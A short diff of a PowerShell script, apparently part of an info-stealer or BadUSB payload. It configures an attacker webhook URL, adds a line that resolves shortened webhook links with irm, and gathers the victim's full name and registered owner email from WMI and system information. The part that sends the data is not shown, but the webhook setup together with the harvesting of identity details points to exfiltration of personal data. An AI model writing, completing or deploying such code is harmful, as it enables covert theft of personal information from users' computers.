@@ -1,4 +1,5 @@
-﻿$hookurl = "YOUR_WEBHOOK_HERE"
+﻿$hookurl = "YOUR_WEBHOOK_HERE" # can be shortened
+ if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
 
 $userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
 $email = (Get-ComputerInfo).WindowsRegisteredOwner
